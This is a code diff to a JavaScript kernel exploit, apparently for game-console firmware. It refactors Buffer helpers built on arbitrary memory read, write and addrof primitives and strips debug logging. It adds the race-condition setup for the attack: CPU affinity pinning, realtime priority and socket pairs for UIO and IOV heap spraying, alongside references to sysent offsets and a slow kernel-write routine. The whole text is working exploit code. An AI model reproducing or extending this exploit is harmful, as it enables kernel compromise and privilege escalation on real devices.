@@ -92,19 +92,37 @@ const off_sysent_661 = fw_config.off_sysent_661;
 const jmp_rsi = fw_config.jmp_rsi;
 const patch_elf_loc = fw_config.patch_elf_loc;
 
-/*Buffer.prototype.write8 = function(offset, value) {
-    this.addr.write8(offset, value);
+
+Buffer.prototype.getLong = function(offset) {
+    return this.addr.read64(offset);
 };
-Buffer.prototype.write32 = function(offset, value) {
+
+Buffer.prototype.getInt = function(offset) {
+    return this.addr.read32(offset);
+};
+
+Buffer.prototype.putLong = function(offset, value) {
+    this.addr.write64(offset, value);
+};
+
+Buffer.prototype.putInt = function(offset, value) {
     this.addr.write32(offset, value);
 };
-*/
 
+Buffer.prototype.fill = function(byte) {
+    const fillByte = byte & 0xFF;
+    for (let i = 0; i < this.size; i++) {
+        this.addr.write8(i, fillByte);
+    }
+};
 
-
-Buffer.prototype.write8 = function(offset, value) {
+Buffer.prototype.address = function() {
+    return mem.addrof(this);
+};
+ Buffer.prototype.write8 = function(offset, value) {
     this.addr.write8(offset, value & 0xFF);
 };
+
 Buffer.prototype.write16 = function(offset, value) {
     this.addr.write16(offset, value & 0xFFFF);
 };
@@ -132,55 +150,6 @@ Buffer.prototype.read32 = function(offset) {
 Buffer.prototype.read64 = function(offset) {
     return this.addr.read64(offset);
 };
-
-
-Buffer.prototype.putLong = function(offset, value) {
-    this.addr.write64(offset, value);
-};
-
-Buffer.prototype.address = function() {
-    return mem.addrof(this);
-};
-Buffer.prototype.fill = function(byte) {
-    const fillByte = byte & 0xFF;
-    for (let i = 0; i < this.size; i++) {
-        this.addr.write8(i, fillByte);
-    }
-};
-
-
-
-/*Buffer.prototype.write8 = function(offset, value) {
-    this.addr.write8(offset, value & 0xFF);
-};
-Buffer.prototype.write16 = function(offset, value) {
-    this.addr.write16(offset, value & 0xFFFF);
-};
-
-Buffer.prototype.write32 = function(offset, value) {
-    this.addr.write32(offset, value >>> 0);
-};
-
-Buffer.prototype.putLong = function(offset, value) {
-    // value può essere Int, Addr, BigInt, numero JS, tutto ok
-    const v = BigInt(value);
-    const low  = Number(v & 0xFFFFFFFFn);
-    const high = Number((v >> 32n) & 0xFFFFFFFFn);
-
-    this.addr.write32(offset, low);
-    this.addr.write32(offset + 4, high);
-};
-
-Buffer.prototype.fill = function(byte) {
-    const v = byte & 0xFF;
-    for (let i = 0; i < this.size; i++) {
-        this.addr.write8(i, v);
-    }
-};
-Buffer.prototype.address = function() {
-    return mem.addrof(this);
-};
-*/
  
     const AF_UNIX = 1;
     const AF_INET6 = 28;
@@ -782,55 +751,6 @@ function kwriteSlow(addr, buffer) {
 
 function performSetup() {
    try {
-      
-        const testBuf = new Buffer(16);
-        log("testBuf created:", testBuf);
-        log("testBuf.size:", testBuf.size);
-        log("testBuf.addr:", testBuf.addr);
-        log("testBuf.addr type:", typeof testBuf.addr);
-        
-      
-        if (testBuf.addr) {
-            log("testBuf.addr.lo:", testBuf.addr.lo);
-            log("testBuf.addr.hi:", testBuf.addr.hi);
-            log("testBuf.addr.write8 exists:", typeof testBuf.addr.write8);
-            log("testBuf.addr.read8 exists:", typeof testBuf.addr.read8);
-        } else {
-            log("ERROR: testBuf.addr is null/undefined!");
-        }
-        
-     
-        log("=== TRYING SINGLE WRITE ===");
-        try {
-            testBuf.addr.write8(0, 0x42);
-            log("Single write succeeded");
-        } catch (e) {
-            log("Single write FAILED:", e);
-        }
-        
- 
-        log("=== TRYING SINGLE READ ===");
-        try {
-            const val = testBuf.addr.read8(0);
-            log("Single read succeeded, value:", val, "hex:", val ? val.toString(16) : "null");
-        } catch (e) {
-            log("Single read FAILED:", e);
-        }
-        
-      
-        log("=== TRYING MEM DIRECTLY ===");
-        try {
-            mem.write8(testBuf.addr, 0x43);
-            log("mem.write8 succeeded");
-            
-            const val2 = mem.read8(testBuf.addr);
-            log("mem.read8 succeeded, value:", val2, "hex:", val2 ? val2.toString(16) : "null");
-        } catch (e) {
-            log("mem operations FAILED:", e);
-        }
-        
-        
-       
         log("Initializing worker states");
         iovState = new WorkerState(IOV_THREAD_NUM);
         uioState = new WorkerState(UIO_THREAD_NUM);
@@ -842,51 +762,54 @@ function performSetup() {
         msg.putLong(0x10, msgIov.address());
         msg.putLong(0x18, MSG_IOV_NUM);
 
-        log("Testing dummyBuffer properties");
-        log("dummyBuffer:", dummyBuffer);
-        log("dummyBuffer.size:", dummyBuffer.size);
-        log("dummyBuffer.addr:", dummyBuffer.addr);
-        
         log("Filling dummy buffer with 0x41");
+        dummyBuffer.fill(0x41);
         
-       
-        const fillByte = 0x41;
-        for (let i = 0; i < Math.min(10, dummyBuffer.size); i++) {
-            try {
-                dummyBuffer.addr.write8(i, fillByte);
-                if (i < 3) log("Wrote byte", i, "successfully");
-            } catch (e) {
-                log("ERROR writing byte", i, ":", e);
-                break;
-            }
-        }
+        log("dummyBuffer first bytes:", 
+            dummyBuffer.read8(0).toString(16),
+            dummyBuffer.read8(1).toString(16),
+            dummyBuffer.read8(2).toString(16));
         
-        log("Reading back bytes");
-        for (let i = 0; i < 3; i++) {
-            try {
-                const val = dummyBuffer.addr.read8(i);
-                log("Byte", i, "=", val ? val.toString(16) : "null/undefined");
-            } catch (e) {
-                log("ERROR reading byte", i, ":", e);
-            }
-        }
-        
-  
         log("Setting up UIO IOV buffers");
         uioIovRead.putLong(0, dummyBuffer.address());
         uioIovWrite.putLong(0, dummyBuffer.address());
         
-     
-        log("Skipping CPU affinity and realtime priority for testing");
-        previousCore = -1;
+        log("Getting current CPU core");
+        try {
+            previousCore = getCurrentCore();
+            log("Current core:", previousCore);
+        } catch (e) {
+            log("Warning: Failed to get current core:", e);
+            previousCore = -1;
+        }
         
-        log("Creating socket pairs");
-        uioSs = new Int32Array(2);
+        log("Setting CPU affinity to core 4");
+        try {
+            const core4Mask = new Buffer(0x10);
+            core4Mask.write32(0, 1 << 4);
+            cpusetSetAffinity(core4Mask);
+            log("CPU affinity set successfully");
+        } catch (e) {
+            log("Warning: Failed to set CPU affinity:", e);
+        }
+
+        log("Setting realtime priority");
+        try {
+            if (!setRealtimePriority(256)) {
+                log("Warning: Failed to set realtime priority");
+            } else {
+                log("Realtime priority set successfully");
+            }
+        } catch (e) {
+            log("Warning: Exception in setRealtimePriority:", e);
+        }
+        
+        log("Creating socket pair for UIO spraying");
         socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
         uioSs0 = uioSs[0];
         uioSs1 = uioSs[1];
    
-        iovSs = new Int32Array(2);
+        log("Creating socket pair for IOV spraying");
         socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs);
         iovSs0 = iovSs[0];
         iovSs1 = iovSs[1];
@@ -1589,6 +1512,7 @@ class WorkerState {
 }
 
 main();
+
 
 
 
